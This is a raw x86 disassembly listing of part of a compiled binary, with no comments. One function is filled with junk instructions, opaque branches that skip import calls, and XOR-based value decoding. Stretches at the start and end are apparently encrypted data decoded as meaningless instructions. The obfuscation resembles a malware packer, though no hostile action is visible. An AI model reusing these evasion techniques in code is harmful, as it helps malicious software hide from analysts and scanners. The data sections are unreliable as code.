  415979:	mov    ebx,0x816b28d2
  41597e:	(bad)  
  415980:	mov    bl,BYTE PTR [esi-0x39]
  415983:	push   esi
  415984:	ins    BYTE PTR es:[edi],dx
  415985:	xchg   esi,eax
  415986:	dec    edx
  415987:	mov    eax,0x3eec2746
  41598c:	jmp    0xf22c00ef
  415991:	cwde   
  415992:	xchg   ebx,eax
  415993:	repnz sbb DWORD PTR [ecx+ebp*8+0x1c],eax
  415998:	add    ebx,DWORD PTR [edi+0x21]
  41599b:	or     BYTE PTR [ebp+ecx*8+0x6ff83a5b],dh
  4159a2:	mov    esi,0x27915643
  4159a7:	mov    DWORD PTR [esi+0x3f],esp
  4159aa:	mov    al,ds:0xbc448e5c
  4159af:	mov    esp,0xd607aaec
  4159b4:	lea    edx,[ebx-0x6e]
  4159b7:	nop
  4159b8:	mov    esi,0xc4fff676
  4159bd:	scas   eax,DWORD PTR es:[edi]
  4159be:	loopne 0x4159ad
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42829b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283d7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42826b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x4281cb,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x42832f
  415a48:	cmp    DWORD PTR ds:0x42826b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428f24
  415a74:	mov    edi,DWORD PTR ds:0x4281ff
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42821f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x4281b7
  415a8f:	and    DWORD PTR ds:0x4283e3,edx
  415a95:	xor    DWORD PTR ds:0x428283,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428337,ecx
  415aa5:	adc    DWORD PTR ds:0x4281ab,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x4281b3
  415ac7:	xor    DWORD PTR ds:0x4282df,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x42822f
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282eb
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x4283c3,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42828f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42820f
  415b25:	mov    edx,DWORD PTR ds:0x42825f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x4283cf,0x0
  415b3a:	not    DWORD PTR ds:0x428353
  415b40:	mov    DWORD PTR ds:0x4282ab,0x4d0
  415b4a:	mov    DWORD PTR ds:0x4281a3,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x4283b3,0x25ca
  415b63:	cmp    DWORD PTR ds:0x4283cf,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42819b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428ebc
  415b83:	add    DWORD PTR ds:0x4283ab,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42835f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x42832b
  415ba0:	adc    DWORD PTR ds:0x428367,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x4281bf,0x0
  415bb5:	mov    DWORD PTR ds:0x4281b7,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428337,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x4281bf,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428297
  415bef:	call   DWORD PTR ds:0x428ec0
  415bf5:	sub    edi,DWORD PTR ds:0x4283e3
  415bfb:	sbb    DWORD PTR ds:0x428367,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281d7
  415c07:	mov    edi,DWORD PTR ds:0x42827f
  415c0d:	and    DWORD PTR ds:0x4281bb,edi
  415c13:	or     DWORD PTR ds:0x4281b3,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281e3
  415c23:	mov    edx,DWORD PTR ds:0x42836b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x4283af,0x0
  415c38:	mov    DWORD PTR ds:0x4283db,ebx
  415c3e:	mov    DWORD PTR ds:0x4281af,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x4281cb,edx
  415c4f:	cmp    DWORD PTR ds:0x4283af,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42834b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428e10
  415c88:	mov    edi,DWORD PTR ds:0x428207
  415c8e:	mov    edx,DWORD PTR ds:0x42838f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428367,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42827f
  415cab:	mov    eax,ds:0x422418
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422638
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x4283cb,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x4282bb
  415cd7:	mov    ebx,DWORD PTR ds:0x4283e3
  415cdd:	mov    DWORD PTR ds:0x428283,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x4283bb,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x4283cb,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428e14
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x4282a7
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x4282bf,0x4282a3
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42834f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428367,0x0
  415d58:	mov    DWORD PTR ds:0x4282c3,0x5216
  415d62:	not    DWORD PTR ds:0x42829b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x4282bb,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282db,ebx
  415d82:	cmp    DWORD PTR ds:0x428367,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280fb
  415d94:	push   0x4280a9
  415d99:	call   DWORD PTR ds:0x428e18
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x4282bf
  415dab:	sbb    DWORD PTR ds:0x4283e3,edx
  415db1:	or     DWORD PTR ds:0x4283c3,ebx
  415db7:	sbb    DWORD PTR ds:0x4282e3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42835f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42819f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428197,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281db,0x4281a3
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281db,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x4283af,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x4282b7,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282e3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42828f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x4282bf,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428347,0x4281cf
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x4281b3,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42835f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x4281cf,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282d7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x4281b3,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428e1c
  415ec4:	or     DWORD PTR ds:0x428273,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x4283ab,0x174
  415ede:	mov    DWORD PTR ds:0x4283cf,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x4283cb
  415eee:	add    edx,DWORD PTR ds:0x4281af
  415ef4:	mov    DWORD PTR ds:0x4283cb,edx
  415efa:	or     DWORD PTR ds:0x4283b7,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428367
  415f06:	or     DWORD PTR ds:0x4282c7,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282d7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42835f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428193,0x0
  415f3b:	mov    DWORD PTR ds:0x4281b7,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x4283b7
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428357,ebx
  415f59:	cmp    DWORD PTR ds:0x428193,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428f28
  415f91:	xor    DWORD PTR ds:0x4283e7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x4282c3
  415f9d:	sub    DWORD PTR ds:0x42827f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x4283bb
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428363
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x4283b3,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x4281cb,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x4281cb
  415fdc:	add    DWORD PTR ds:0x4282b3,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42827f,0x0
  415fec:	mov    DWORD PTR ds:0x4283d3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283e7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x4283b3,0x1cd3
  416015:	mov    DWORD PTR ds:0x4281af,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42827f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428f2c
  416037:	add    DWORD PTR ds:0x4281b3,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428357,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42828f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428287
  41605c:	adc    DWORD PTR ds:0x4282ab,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283db,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428347,0x4282bf
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x4281cf,0x0
  416089:	mov    DWORD PTR ds:0x428367,0x1e83
  416093:	mov    DWORD PTR ds:0x4283c3,edx
  416099:	movzx  ecx,WORD PTR ds:0x42829b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281d3
  4160ad:	cmp    DWORD PTR ds:0x4281cf,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428e20
  4160c6:	adc    DWORD PTR ds:0x42835b,edi
  4160cc:	or     DWORD PTR ds:0x42829b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42826f
  4160dc:	sub    DWORD PTR ds:0x4281cb,ecx
  4160e2:	add    DWORD PTR ds:0x4282bf,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422598
  4160f5:	and    ecx,DWORD PTR ds:0x4282af
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x4283bb,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283d3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x4281cb,0x0
  416120:	mov    DWORD PTR ds:0x4283b3,0x7b16
  41612a:	mov    DWORD PTR ds:0x4281cf,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x4282ab,0x5f2a
  416143:	cmp    DWORD PTR ds:0x4281cb,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f30
  416159:	xor    DWORD PTR ds:0x4281a7,0x42819b
  416163:	sub    DWORD PTR ds:0x428193,0x4281bf
  41616d:	sbb    DWORD PTR ds:0x4282cf,0x4282c7
  416177:	and    DWORD PTR ds:0x4282bf,0x56d1
  416181:	xor    DWORD PTR ds:0x4282ab,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42829f,0x4281db
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42824f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281d3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x4281cb,0x4282a7
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x4282cb,0x42828b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428357,0x42826b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x4282c3,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	in     al,dx
  416310:	sub    BYTE PTR [ebx],0xbe
  416313:	hlt    
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x30181814],bl
  41631c:	mov    ah,0x66
  41631e:	not    BYTE PTR [esi]
  416320:	mov    edi,0xa9598ee5
  416325:	test   DWORD PTR [ebx-0x74],esp
  416328:	stos   BYTE PTR es:[edi],al
  416329:	sbb    al,0x28
  41632b:	in     al,0x88
  41632d:	sbb    dl,bh
  41632f:	gs out 0xde,al
  416332:	aad    0x70
  416334:	in     eax,dx
  416335:	pop    ecx
  416336:	push   cs
  416337:	test   al,0x3d
  416339:	inc    edi
  41633a:	popf   
  41633b:	dec    ecx
  41633c:	push   ss
  41633d:	lea    ebx,[ecx-0x52197013]
  416343:	cmp    al,0x40
  416345:	call   FWORD PTR [edx+0x2]
  416348:	lds    ecx,FWORD PTR [ebp+0x66e795f8]
  41634e:	mov    edi,0xee8c0542
  416353:	inc    esi
  416354:	mov    bl,0xcb
  416356:	inc    edx
  416357:	in     al,dx
  416358:	sbb    DWORD PTR [esi+esi*8],0x2fb8a014
  41635f:	jmp    0x3931:0x8f4edcf2
  416366:	lock mov cl,ah
  416369:	inc    eax
  41636a:	jnp    0x41637f
  41636c:	mov    al,ds:0x42ca5a76
  416371:	popa   
  416372:	inc    ebx
  416373:	sub    eax,0x5a83aa8
  416378:	jp     0x4163cd
  41637a:	adc    DWORD PTR [edx-0x28],edi
  41637d:	sbb    esp,edi
  41637f:	add    ebx,esi
  416381:	cmc    
  416382:	xchg   ebx,eax
  416383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416384:	dec    di
  416386:	mov    ah,0xb2
  416388:	sub    al,0xeb
  41638a:	and    esp,DWORD PTR [edi]
  41638c:	js     0x4163a9
  41638e:	mov    eax,ds:0x439b2a4
  416393:	dec    esp
  416394:	in     eax,dx
  416395:	sbb    al,0x55
  416397:	in     eax,0xba
  416399:	mov    ds:0x1a79788,al
  41639e:	std    
  41639f:	mov    ebx,DWORD PTR [ebp-0x4a]
  4163a2:	enter  0x6fe2,0x54
  4163a6:	jno    0x4163a3
  4163a8:	ins    DWORD PTR es:[edi],dx
  4163a9:	fadd   st(7),st
  4163ab:	fcmovnu st,st(0)
  4163ad:	popf   
  4163ae:	jns    0x416352
  4163b0:	out    dx,al
  4163b1:	cmp    cl,BYTE PTR [esi]
  4163b3:	push   esp
  4163b4:	in     al,dx
  4163b5:	jle    0x4163b5
  4163b7:	data16 icebp 
  4163b9:	leave  
  4163ba:	or     esp,DWORD PTR [ebx+edx*8-0x70]
  4163be:	int    0x21
  4163c0:	add    ecx,DWORD PTR [edi+ecx*8-0x9]
  4163c4:	pop    esp
  4163c5:	mov    dl,0x19
  4163c7:	add    bh,bh
  4163c9:	outs   dx,DWORD PTR ds:[esi]
  4163ca:	add    ebx,DWORD PTR [esi-0x2bfab598]
  4163d0:	jnp    0x416451
  4163d2:	bound  ebp,QWORD PTR [esi]
  4163d4:	mov    ah,0x18
  4163d6:	call   0xfe239ff2
  4163db:	inc    edi
  4163dc:	inc    ebx
  4163dd:	inc    esi
  4163de:	mov    edx,0x42231725
  4163e3:	jp     0x41636d
  4163e5:	jge    0x4163b6
  4163e7:	adc    ah,BYTE PTR [esi]
  4163e9:	imul   ecx,esi,0x32d7d375
  4163ef:	dec    eax
  4163f0:	loope  0x416454
  4163f2:	das    
  4163f3:	or     BYTE PTR [edx+eax*4+0x559d59b1],al
  4163fa:	push   edi
  4163fb:	shl    BYTE PTR [ebp-0x34b38b21],1
  416401:	mov    dh,0xa1
  416403:	pop    esp
  416404:	adc    al,0xd2
  416406:	jmp    0x4882:0x5d90c45a
  41640d:	dec    edi
  41640e:	inc    edi
  41640f:	clc    
  416410:	lea    ecx,[ebx]
  416412:	sub    dh,BYTE PTR [esi+0x2d]
  416415:	xor    eax,0x6990e543
  41641a:	or     esi,DWORD PTR [eax]
  41641c:	ss inc eax
  41641e:	mov    esp,0x34904580
  416423:	lds    edi,FWORD PTR [ebp-0xd88ac10]
  416429:	das    
  41642a:	dec    esi
  41642b:	jae    0x416495
  41642d:	push   ds
  41642e:	mov    ch,0xa
  416430:	retf   0x87d4
  416433:	push   ecx
  416434:	pushf  
  416435:	cmc    
  416436:	push   esp
  416437:	mov    ah,0x1
  416439:	popf   
  41643a:	or     DWORD PTR [ebx],ecx
  41643c:	xchg   edx,eax
  41643d:	adc    BYTE PTR [esi+0x4e07ae5b],0x57
  416444:	mov    ebp,0xc453b11c
  416449:	loop   0x4163e7
  41644b:	jo     0x416403
  41644d:	test   al,0x2d
  41644f:	or     DWORD PTR [ebx+eax*4-0x1b],esi
  416453:	mov    ch,BYTE PTR [ecx-0x13]
  416456:	aas    
  416457:	lods   eax,DWORD PTR ds:[esi]
  416458:	les    edx,FWORD PTR [edi-0x4399a937]
  41645e:	ins    BYTE PTR es:[edi],dx
  41645f:	pop    ecx
  416460:	or     eax,0xa5a2d2b3
  416465:	sahf   
  416466:	dec    ecx
  416467:	repnz push eax
  416469:	sub    BYTE PTR [eax-0x35ce8ac7],ch
  41646f:	mov    al,0x2f
  416471:	adc    DWORD PTR [ebx+ebx*4+0x15],ebx
  416475:	mov    ebp,0x53bd3c19
  41647a:	mov    BYTE PTR [edx],al
  41647c:	mov    ch,0x7f
  41647e:	test   eax,0xb0e8df0f
  416483:	dec    eax
  416484:	adc    eax,DWORD PTR [edx+esi*2]
  416487:	dec    ecx
